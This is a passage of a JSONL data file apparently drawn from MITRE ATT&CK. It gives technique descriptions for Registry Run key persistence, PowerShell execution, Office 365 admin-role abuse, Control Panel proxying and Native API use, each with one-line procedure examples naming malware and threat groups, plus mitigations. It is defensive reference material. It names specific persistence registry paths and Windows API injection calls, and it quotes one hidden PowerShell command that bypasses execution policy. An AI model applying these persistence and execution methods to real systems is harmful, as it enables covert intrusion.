"EVILNUM can achieve persistence through the Registry Run key.", "BADNEWS installs a registry Run key to establish persistence.", "BadPatch establishes a foothold by adding a link to the malware executable in the startup folder.", "APT3 places scripts in the startup folder for persistence.", "TeamTNT has added batch scripts to the startup folder.", "NOKKI has established persistence by writing the payload to the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>.", "PUNCHBUGGY has been observed using a Registry Run key.", "LoJax has modified the Registry key <code>‘HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute’</code> from <code>‘autocheck autochk *’</code> to <code>‘autocheck autoche *’</code> in order to execute its payload during Windows startup.", "Dark Caracal's version of Bandook adds a registry key to <code>HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> for persistence.", "Kimsuky has placed scripts in the startup folder for persistence.", "ObliqueRAT can gain persistence by a creating a shortcut in the infected user's Startup directory.", "The BlackEnergy 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.", "Gorgon Group malware can create a .lnk file and add a Registry Run key to establish persistence.", "CrossRAT uses run keys for persistence on Windows", "Seasalt creates a Registry entry to ensure infection after reboot under <code>HKLM\\Software\\Microsoft\\Windows\\currentVersion\\Run</code>.", "Wizard Spider has established persistence via the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run and a shortcut within the startup folder.", "Final1stspy creates a Registry Run key to establish persistence.", "JCry has created payloads in the Startup directory to maintain persistence. ", "ChChes establishes persistence by adding a Registry Run key.", "Nebulae can achieve persistence through a Registry Run key.", "Higaisa added a spoofed binary to the start-up folder for persistence.", "Gamaredon Group tools have registered Run keys in the registry to give malicious VBS files persistence.", "Lazarus Group malware attempts to maintain persistence by saving itself in the Start menu folder or by adding a Registry Run key.", "SDBbot has the ability to add a value to the Registry Run key to establish persistence if it detects it is running with regular user privilege. ", "One persistence mechanism used by CozyCar is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys: <br><code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\</code> <br><code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\</code> <br><code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code> <br><code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>", "Several Ke3chang backdoors achieved persistence by adding a Run key.", "Backdoor.Oldrea adds Registry Run keys to achieve persistence.", "FELIXROOT adds a shortcut file to the startup folder for persistence.", "APT28 has deployed malware that has copied itself to the startup directory for persistence.", "Darkhotel has been known to establish persistence by adding programs to the Run Registry key.", "TrickBot establishes persistence in the Startup folder.", "Emotet has been observed adding the downloaded payload to the <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> key to maintain persistence.", "RunningRAT adds itself to the Registry key <code>Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> to establish persistence upon reboot.", "Sidewinder has added paths to executables in the Registry to establish persistence.", "Naikon has modified a victim's Windows Run registry to establish persistence.", "Silence has used <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>, <code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>, and the Startup folder to establish persistence.\t", "RogueRobin created a shortcut in the Windows startup folder to launch a PowerShell script each time the user logs in to establish persistence.", "njRAT has added persistence via the Registry key <code>HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\</code> and dropped a shortcut in <code>%STARTUP%</code>.", "QakBot can maintain persistence by creating an auto-run Registry key.", "SeaDuke is capable of persisting via the Registry Run key or a .lnk file stored in the Startup directory.", "Aria-body has established persistence via the Startup folder or Run Registry key.", "The \"SCOUT\" variant of NETEAGLE achieves persistence by adding itself to the <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key.", "Remexi utilizes Run Registry keys in the HKLM hive as a persistence mechanism.", "Remcos can add itself to the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> for persistence.", "POWERTON can install a Registry Run key for persistence.", "Xbash can create a Startup item for persistence if it determines it is on a Windows system.", "USBStealer registers itself under a Registry Run key with the name \"USB Disk Security.\"", "PoetRAT has added a registry key in the <RUN> hive for persistence.", "Mustang Panda has created the registry key <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobelmdyU</code> to maintain persistence.", "RTM tries to add a Registry Run key under the name \"Windows Update\" to establish persistence.", "Rover persists by creating a Registry entry in <code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\</code>.", "APT29 added Registry Run keys to establish persistence.", "APT41 created and modified startup files for persistence. APT41 added a registry key in <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost</code> to establish persistence for Cobalt Strike.", "Magic Hound malware has used Registry Run keys to establish persistence.", "Turian can establish persistence by adding Registry Run keys.", "DownPaper uses PowerShell to add a Registry Run key in order to establish persistence.", "Cardinal RAT establishes Persistence by setting the  <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load</code> Registry key to point to its executable.", "Avaddon uses registry run keys for persistence.", "FinFisher establishes persistence by creating the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\Run</code>.", "BabyShark has added a Registry key to ensure all future macros are enabled for Microsoft Word and Excel as well as for additional persistence.", "PROMETHIUM has used Registry run keys to establish persistence.", "TinyZBot can create a shortcut in the Windows startup folder for persistence.", "POWERSOURCE achieves persistence by setting a Registry Run key, with the path depending on whether the victim account has user or administrator access.", "SPACESHIP achieves persistence by creating a shortcut in the current user's Startup folder.", "A version of KONNI drops a Windows shortcut into the Startup folder to establish persistence.", "AppleSeed has the ability to create the Registry key name <code>EstsoftAutoUpdate</code> at <code>HKLU\\Software\\Microsoft/Windows\\CurrentVersion\\RunOnce</code> to establish persistence.", "TAINTEDSCRIBE can copy itself into the current user’s Startup folder as “Narrator.exe” for persistence.", "Mivast creates the following Registry entry: <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Micromedia</code>.", "BBSRAT has been loaded through DLL side-loading of a legitimate Citrix executable that is set to persist through the Registry Run key location <code>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe</code>.", "APT18 establishes persistence via the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> key.", "MarkiRAT can drop its payload into the Startup directory to ensure it automatically runs when the compromised system is started.", "FLASHFLOOD achieves persistence by making an entry in the Registry's Run key.", "TURNEDUP is capable of writing to a Registry Run key to establish.", "SharpStage has the ability to create persistence for the malware using the Registry autorun key and startup folder. ", "Comnie achieves persistence by adding a shortcut of itself to the startup path in the Registry.", "ShimRat has installed a registry based start-up key <code>HKCU\\Software\\microsoft\\windows\\CurrentVersion\\Run</code> to maintain persistence should other methods fail.", "PlugX adds Run key entries in the Registry to establish persistence.", "NETWIRE creates a Registry start-up entry to establish persistence."], "is_subtechnique": true}
{"text": " Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems). PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk. A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363), [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack) PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)", "idx": "https://attack.mitre.org/techniques/T1059/001", "title": "PowerShell", "entity": "PowerShell", "entity_type": "techniques", "entity_context": ["Lokibot has used PowerShell commands embedded inside batch scripts. ", "One version of Helminth uses a PowerShell script.", "njRAT has executed PowerShell commands via auto-run registry key persistence.", "PS1 can utilize a PowerShell loader.", "Bazar can execute a PowerShell script received from C2.", "APT33 has utilized PowerShell to download files from the C2 server and run various scripts. ", "ServHelper has the ability to execute a PowerShell script to get information from the infected host.", "The NETWIRE binary has been executed via PowerShell script.", "DownPaper uses PowerShell for execution.", "FIN8's malicious spearphishing payloads are executed as PowerShell. FIN8 has also used PowerShell for lateral movement and credential access.", "Empire leverages PowerShell for the majority of its client-side agent tasks. Empire also contains the ability to conduct PowerShell remoting with the <code>Invoke-PSRemoting</code> module.", "POWERSOURCE is a PowerShell backdoor.", "QUADAGENT uses PowerShell scripts for execution.", "SHARPSTATS has the ability to employ a custom PowerShell script.", "TEMP.Veles has used a publicly-available PowerShell-based tool, WMImplant. The group has also used PowerShell to perform Timestomping.", "ComRAT has used PowerShell to load itself every time a user logs in to the system. ComRAT can execute PowerShell scripts loaded into memory or from the file system.", "BONDUPDATER is written in PowerShell.", "When PowerShell is necessary, restrict PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.", "HALFBAKED can execute PowerShell scripts.", "Mustang Panda has used malicious PowerShell scripts to enable execution.", "FIN10 uses PowerShell for execution as well as PowerShell Empire to establish persistence.", "APT38 has used PowerShell to execute commands and other operational tasks.", "Pillowmint has used a PowerShell script to install a shim database.\t", "Cobalt Group has used powershell.exe to download and execute scripts.", "MuddyWater has used PowerShell for execution.", "Threat Group-3390 has used PowerShell for execution.", "KGH_SPY can execute PowerShell commands on the victim's machine.", "Tonto Team has used PowerShell to download additional payloads.", "WellMess can execute PowerShell scripts received from C2.", "APT3 has used PowerShell on victim systems to download and run payloads after exploitation.", "OilRig has used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents.", "There is a variant of RATANKBA that uses a PowerShell script instead of the traditional PE form.", "Ursnif droppers have used PowerShell in download cradles to download and execute the malware's full executable payload.", "Operation Wocao has used PowerShell on compromised systems.", "PowerShower is a backdoor written in PowerShell.", "Wizard Spider has used macros to execute PowerShell scripts to download malware on victim's machines. It has also used PowerShell to execute commands and move laterally through a victim network.", "BloodHound can use PowerShell to pull Active Directory information from the target environment.", "Socksbot can write and execute PowerShell scripts.", "Thrip leveraged PowerShell to run commands to download payloads, traverse the compromised networks, and carry out reconnaissance.", "MoleNet can use PowerShell to set persistence. ", "Indrik Spider has used PowerShell Empire for execution of malware. ", "CopyKittens has used PowerShell Empire.", "Leviathan has used PowerShell for execution.", "Patchwork used PowerSploit to download payloads, run a reverse shell, and execute malware on the victim's machine.", "SeaDuke uses a module to execute Mimikatz with PowerShell to perform Pass the Ticket.", "Dragonfly 2.0 used PowerShell scripts for execution.", "StrongPity can use PowerShell to add files to the Windows Defender exclusions list.", "OSX_OCEANLOTUS.D uses PowerShell scripts.", "Frankenstein has used PowerShell to run a series of base64-encoded commands, that acted as a stager and enumerated hosts.\t", " FIN6 has used PowerShell to gain access to merchant's networks, and a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.", "Inception has used PowerShell to execute malicious commands and payloads.", "Emotet has used Powershell to retrieve the malicious payload and download additional resources like Mimikatz. ", "CrackMapExec can execute PowerShell commands via WMI.", "Cobalt Strike can execute a payload on a remote host with PowerShell. This technique does not write any data to disk. Cobalt Strike can also use PowerSploit and other scripting frameworks to perform execution.", "Pysa has used Powershell scripts to deploy its ransomware. ", "APT32 has used PowerShell-based tools, PowerShell one-liners, and shellcode loaders for execution.", "FatDuke has the ability to execute PowerShell scripts.", "The Poseidon Group's Information Gathering Tool (IGT) includes PowerShell components.", "It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions.\n\nDisable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.", "Fox Kitten has used PowerShell scripts to access credential data.", "Pupy has a module for loading and executing PowerShell scripts.", "HAMMERTOSS is known to use PowerShell.", "Anti-virus can be used to automatically quarantine suspicious files. ", "Denis has a version written in PowerShell.\t", "AutoIt backdoor downloads a PowerShell script that decodes to a typical shellcode loader.", "Xbash can use scripts to invoke PowerShell to download a malicious PE executable or PE DLL for execution.", "KeyBoy uses PowerShell commands to download and execute payloads.", "RogueRobin uses a command prompt to run a PowerShell script from Excel. To assist in establishing persistence, RogueRobin creates <code>%APPDATA%\\OneDrive.bat</code> and saves the following string to it:<code>powershell.exe -WindowStyle Hidden -exec bypass -File “%APPDATA%\\OneDrive.ps1”</code>.", "BRONZE BUTLER has used PowerShell for execution.", "POWRUNER is written in PowerShell.", "APT28 downloads and executes PowerShell scripts and performs PowerShell commands.", "Silence has used PowerShell to download and execute payloads.", "Kimsuky has executed a variety of PowerShell scripts.", "APT39 has used PowerShell to execute malicious code.", "PowerSploit modules are written in and executed via PowerShell.", "SMOKEDHAM can execute Powershell commands sent from its C2 server.", "menuPass uses PowerSploit to inject shellcode into PowerShell.", "Valak has used PowerShell to download additional modules.", "POSHSPY uses PowerShell to execute various commands, one to execute its payload.", "APT19 used PowerShell commands to execute payloads.", "DarkHydrus leveraged PowerShell to download and execute additional scripts for execution.", "DarkVishnya used PowerShell to create shellcode loaders.", "TeamTNT has executed PowerShell commands in batch scripts.", "AppleSeed has the ability to execute its payload via PowerShell.", "QakBot can use PowerShell to download and execute payloads.", "Magic Hound has used PowerShell for execution and privilege escalation.", "Sidewinder has used PowerShell to drop and execute malware loaders.", "Revenge RAT uses the PowerShell command <code>Reflection.Assembly</code> to load itself into memory to aid in execution.", "Use application control where appropriate.", "JCry has used PowerShell to execute payloads.", "Gorgon Group malware can use PowerShell commands to download and execute a payload and open a decoy document on the victim’s machine.", "Hancitor has used PowerShell to execute commands.", "APT41 leveraged PowerShell to deploy malware families in victims’ environments.", "TA459 has used PowerShell for execution of a payload.", "REvil has used PowerShell to delete volume shadow copies and download files.", "Blue Mockingbird has used PowerShell reverse TCP shells to issue interactive commands over a network connection.", "WIRTE has used PowerShell for script execution.", "Deep Panda has used PowerShell scripts to download and execute programs in memory, without writing to disk.", "TrickBot has been known to use PowerShell to download new payloads, open documents, and upload data to command and control servers. \n ", "Turla has used PowerShell to execute commands/scripts, in some cases via a custom executable or code from Empire's PSInject. Turla has also used PowerShell scripts to load and execute malware in memory.", "APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke. APT29 also used PowerShell to create new tasks on remote machines, identify configuration settings, evade defenses, exfiltrate data, and to execute other commands.", "GALLIUM used PowerShell for execution to assist in lateral movement as well as for dumping credentials stored on compromised machines.", "PUNCHBUGGY has used PowerShell scripts.", "TA505 has used PowerShell to download and execute malware and reconnaissance scripts.", "Netwalker has been written in PowerShell and executed directly in memory, avoiding detection.", "Set PowerShell execution policy to execute only signed scripts.", "SQLRat has used PowerShell to create a Meterpreter session.", "POWERTON is written in PowerShell.", "Molerats used PowerShell implants on target machines.", "GOLD SOUTHFIELD has staged and executed PowerShell scripts on compromised hosts.", "ConnectWise can be used to execute PowerShell commands on target machines.", "SharpStage can execute arbitrary commands with PowerShell.", "HAFNIUM has used the Exchange Power Shell module <code>Set-OabVirtualDirectoryPowerShell</code> to export mailbox data.", "Chimera has used PowerShell scripts to execute malicious payloads and the DSInternals PowerShell module to make use of Active Directory features.\t", "Sandworm Team has used PowerShell scripts to run a credential harvesting tool in memory to evade defenses. ", "Gallmaker used PowerShell to download additional payloads and for execution.", "Nomadic Octopus has used PowerShell for execution. ", "JSS Loader has the ability to download and execute PowerShell scripts.", "FIN7 used a PowerShell script to launch shellcode that retrieved an additional payload.", "Cuba has been dropped onto systems and used for lateral movement via obfuscated PowerShell scripts.", "KONNI used PowerShell to download and execute a specific 64-bit version of the malware.", "POWERSTATS uses PowerShell for obfuscation and execution.", "Zeus Panda uses PowerShell to download and execute the payload.", "PowerStallion uses PowerShell loops to iteratively check for available commands in its OneDrive C2 server.", "Egregor has used an encoded PowerShell command by a service created by Cobalt Strike for lateral movement.", "RegDuke can extract and execute PowerShell scripts from C2 communications.", "Mosquito can launch PowerShell Scripts.", "GRIFFON has used PowerShell to execute the Meterpreter downloader TinyMet.", "Stealth Falcon malware uses PowerShell commands to perform various functions, including gathering system information via WMI and executing commands from its C2 server.", "Bandook has used PowerShell loaders as part of execution."], "is_subtechnique": true}
{"text": " An adversary may add the Global Administrator role to an adversary-controlled account to maintain persistent access to an Office 365 tenant.(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins) via the global admin role.(Citation: Microsoft O365 Admin Roles) This account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity.", "idx": "https://attack.mitre.org/techniques/T1098/003", "title": "Add Office 365 Global Administrator Role", "entity": "Add Office 365 Global Administrator Role", "entity_type": "techniques", "entity_context": ["Use multi-factor authentication for user and privileged accounts.", "Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."], "is_subtechnique": true}
{"text": " Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) Malicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists. Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.(Citation: ESET InvisiMole June 2020)", "idx": "https://attack.mitre.org/techniques/T1218/002", "title": "Control Panel", "entity": "Control Panel", "entity_type": "techniques", "entity_context": ["Identify and block potentially malicious and unknown .cpl files by using application control  tools, like Windows Defender Application Control, AppLocker,   or Software Restriction Policies  where appropriate. ", "InvisiMole can register itself for execution and persistence via the Control Panel.", "Restrict storage and execution of Control Panel items to protected directories, such as <code>C:\\Windows</code>, rather than user directories.", "Reaver drops and executes a malicious CPL file as its payload."], "is_subtechnique": true}
{"text": " Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations. Native API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. (Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC) Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation) Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system. While invoking API", "idx": "https://attack.mitre.org/techniques/T1106", "title": "Native API", "entity": "Native API", "entity_type": "techniques", "entity_context": ["Explosive has a function to call the OpenClipboard wrapper.  ", "After escalating privileges, MegaCortex calls <code>TerminateProcess()</code>, <code>CreateRemoteThread</code>, and other Win32 APIs.", "Chaes used the <code>CreateFileW()</code> API function with read permissions to access downloaded payloads. ", "LightNeuron is capable of starting a process using CreateProcess.", "Grandoreiro can execute through the <code>WinExec</code> API.", "Attor's dispatcher has used CreateProcessW API for execution.", "Siloscape makes various native API calls.", "APT38 has used the Windows API to execute code within a victim's system. ", "Bandook has used the ShellExecuteW() function call. ", "ADVSTORESHELL is capable of starting a process using CreateProcess.", "TrickBot uses the Windows API call, CreateProcessW(), to manage execution flow. TrickBot has also used <code>Nt*</code> API functions to perform Process Injection.", "Cobalt Strike's Beacon payload is capable of running shell commands without <code>cmd.exe</code> and PowerShell commands without <code>powershell.exe</code>", "Egregor has used the Windows API to make detection more difficult. ", "Gamaredon Group malware has used <code>CreateProcess</code> to launch additional malicious components.", "Ramsay can use Windows API functions such as <code>WriteFile</code>, <code>CloseHandle</code>, and <code>GetCurrentHwProfile</code> during its collection and file storage operations. Ramsay can execute its embedded components via <code>CreateProcessA</code> and <code>ShellExecute</code>.", "Hancitor has used <code>CallWindowProc</code> and <code>EnumResourceTypesA</code> to interpret and execute shellcode.", "EvilBunny has used various API calls as part of its checks to see if the malware is running in a sandbox.\t", "Conti has used API calls during execution. ", "SodaMaster can use <code>RegOpenKeyW</code> to access the Registry.", "Denis used the <code>IsDebuggerPresent</code>, <code>OutputDebugString</code>, and <code>SetLastError</code> APIs to avoid debugging. Denis used <code>GetProcAddress</code> and <code>LoadLibrary</code> to dynamically resolve APIs. Denis also used the <code>Wow64SetThreadContext</code> API as part of a process hollowing process.\t", "AppleSeed has the ability to use multiple dynamically resolved API calls.", "SUNSPOT used Windows API functions such as <code>MoveFileEx</code> and <code>NtQueryInformationProcess</code> as part of the SUNBURST injection process. ", "GoldenSpy can execute remote commands in the Windows command shell using the <code>WinExec()</code> API.\t", "RDFSNIFFER has used several Win32 API functions to interact with the victim machine.", "BitPaymer has used dynamic API resolution to avoid identifiable strings within the binary, including <code>RegEnumKeyW</code>.", "Identify and block potentially malicious software executed that may be executed through this technique by using application control  tools, like Windows Defender Application Control, AppLocker,   or Software Restriction Policies  where appropriate. ", "APT37 leverages the Windows API calls: VirtualAlloc(), WriteProcessMemory(), and CreateRemoteThread() for process injection.", "KillDisk has called the Windows API to retrieve the hard disk handle and shut down the machine.", "menuPass has used native APIs including <code>GetModuleFileName</code>, <code>lstrcat</code>, <code>CreateFile</code>, and <code>ReadFile</code>.", "Bazar can use various APIs to allocate memory and facilitate code execution/injection.", "Babuk can use multiple Windows API calls for actions on compromised hosts including discovery and execution.", "Higaisa has called various native OS APIs.", "Rising Sun used dynamic API resolutions to various Windows APIs by leveraging LoadLibrary() and GetProcAddress().", "BackConfig can leverage API functions such as <code>ShellExecuteA</code> and <code>HttpOpenRequestA</code> in the process of downloading and executing files.", "Tropic Trooper has used multiple Windows APIs including HttpInitialize, HttpCreateHttpHandle, and HttpAddUrl.", "GrimAgent can use Native API including <code>GetProcAddress</code> and <code>ShellExecuteW</code>.", "Mosquito leverages the CreateProcess() and LoadLibrary() calls to execute files with the .dll and .exe extensions.", "PolyglotDuke can use <code>LoadLibraryW</code> and <code>CreateProcess</code> to load and execute code.", "Cuba has used several built-in API functions for discovery like GetIpNetTable and NetShareEnum. ", "Taidoor has the ability to use native APIs for execution including <code>GetProcessHeap</code>, <code>GetProcAddress</code>, and <code>LoadLibrary</code>.", "SombRAT has the ability to respawn itself using <code>ShellExecuteW</code> and <code>CreateProcessW</code>.", "Netwalker can use Windows API functions to inject the ransomware DLL.", "HotCroissant can perform dynamic DLL importing and API lookups using <code>LoadLibrary</code> and <code>GetProcAddress</code> on obfuscated strings.", "Metamorfo has used native WINAPI calls.", "HyperBro has the ability to run an application (<code>CreateProcessW</code>) or script/file (<code>ShellExecuteW</code>) via API.", "Nebulae has the ability to use <code>CreateProcess</code> to execute a process.", "Empire contains a variety of enumeration modules that have an option to use API calls to carry out tasks.", "Imminent Monitor has leveraged CreateProcessW() call to execute the debugger.", "xCaon has leveraged native OS function calls to retrieve  victim's network adapter's  information using GetAdapterInfo() API. ", "Silence has leveraged the Windows API, including using CreateProcess() or ShellExecute(), to perform a variety of tasks.", "njRAT has used the ShellExecute() function within a script.", "Sharpshooter's first-stage downloader resolved various Windows libraries and APIs, including LoadLibraryA(), GetProcAddress(), and CreateProcessA().\t", "PipeMon's first stage has been executed by a call to <code>CreateProcess</code> with the decryption password in an argument. PipeMon has used a call to <code>LoadLibrary</code> to load its installer.", "BADNEWS has a command to download an .exe and execute it via CreateProcess API. It can also run with ShellExecute.", "Gorgon Group malware can leverage the Windows API call, CreateProcessA(), for execution.", "BBK has the ability to use the <code>CreatePipe</code> API to add a sub-process for execution via cmd.", "ComRAT can load a PE file from memory or the file system and execute it with <code>CreateProcessW</code>.", "HyperStack can use Windows API's <code>ConnectNamedPipe</code> and <code>WNetAddConnection2</code> to detect incoming connections and connect to remote shares.", "Dridex has used the <code>OutputDebugStringW</code> function to avoid malware analysis as part of its anti-debugging technique. ", "BoxCaon has used Windows API calls to obtain information about the compromised host.", "Maze has used several Windows API functions throughout the encryption process including IsDebuggerPresent, TerminateProcess, Process32FirstW, among others.\t", "ShimRat has used Windows API functions to install the service and shim.\t", "Pony has used several Windows functions for various purposes.\t", "InnaputRAT uses the API call ShellExecuteW for execution.", "ShimRatReporter used several Windows API functions to gather information from the infected system.", "BloodHound can use .NET API calls in the SharpHound ingestor component to pull Active Directory data.", "Clop has used built-in API functions such as WNetOpenEnumW(), WNetEnumResourceW(), WNetCloseEnum(), GetProcAddress(), and VirtualAlloc().", "BendyBear can load and execute modules and Windows Application Programming (API) calls using standard shellcode API hashing.", "Chimera has used direct Windows system calls by leveraging Dumpert.", "InvisiMole can use winapiexec tool for indirect execution of  <code>ShellExecuteW</code> and <code>CreateProcessA</code>.", "WastedLocker's custom crypter, CryptOne, leveraged the VirtualAlloc() API function to help execute the payload.", "Bad Rabbit has used various Windows API calls.", "NETWIRE can use Native API including <code>CreateProcess</code> <code>GetProcessById</code>, and <code>WriteProcessMemory</code>.", "REvil can use Native API for execution and to retrieve active services.", "Lokibot has used LoadLibrary(), GetProcAddress() and CreateRemoteThread() API functions to execute its shellcode.", "Bankshot creates processes using the Windows API calls: CreateProcessA() and CreateProcessAsUserA().", "WindTail can invoke Apple APIs <code>contentsOfDirectoryAtPath</code>, <code>pathExtension</code>, and (string) <code>compare</code>.", "GuLoader can use a number of different APIs for discovery and execution.", "Turla and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.", "HAWKBALL has leveraged several Windows API calls to create processes, gather disk information, and detect debugger activity.", "Ursnif has used <code>CreateProcessW</code> to create child processes.", "Carberp has used the NtQueryDirectoryFile and ZwQueryDirectoryFile functions to hide files and directories.", "The file collection tool used by RainyDay can utilize native API including <code>ReadDirectoryChangeW</code> for folder monitoring.", "Stuxnet uses the SetSecurityDescriptorDacl API to reduce object integrity levels.", "XAgentOSX contains the execFile function to execute a specified file on the system using the NSTask:launch method.", "Pillowmint has used multiple native Windows APIs to execute and conduct process injections.", "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office VBA macros from calling Win32 APIs. ", "RTM can use the <code>FindNextUrlCacheEntryA</code> and <code>FindFirstUrlCacheEntryA</code> functions to search for specific strings within browser history.", "MarkiRAT can run the ShellExecuteW API via the Windows Command Shell.", "Avaddon has used the Windows Crypto API to generate an AES key.", "IcedID has called <code>ZwWriteVirtualMemory</code>, <code>ZwProtectVirtualMemory</code>, <code>ZwQueueApcThread</code>, and <code>NtResumeThread</code> to inject itself into a remote process.", "Volgmer executes payloads using the Windows API call CreateProcessW().", "PlugX can use the Windows API function CreateProcess to execute another process.", "Goopy has the ability to  enumerate the infected system's user name via <code>GetUserNameW</code>.", "Aria-body has the ability to launch files using <code>ShellExecute</code>.", "SideTwist can use <code>GetUserNameW</code>, <code>GetComputerNameW</code>, and <code>GetComputerNameExW</code> to gather information.", "ThiefQuest uses various API to perform behaviors such as executing payloads and performing local enumeration.", "Operation Wocao has used the CreateProcessA and ShellExecute API function to launch commands after being injected into a selected process.", "build_downer has the ability to use the <code>WinExec</code> API to execute malware on a compromised host.", "FatDuke can call <code>ShellExecuteW</code> to open the default browser on the URL localhost.", "SynAck parses the export tables of system DLLs to locate and call various Windows API functions.", "Ryuk has used multiple native APIs including <code>ShellExecuteW</code> to run executables,<code>GetWindowsDirectoryW</code> to create folders, and <code>VirtualAlloc</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code> for process injection.", "Waterbear can leverage API functions for execution.", "gh0st RAT has used the InterlockedExchange, SeShutdownPrivilege, and ExitWindowsEx Windows API functions.", "QakBot can use <code>GetProcAddress</code> to help delete malicious strings from memory."], 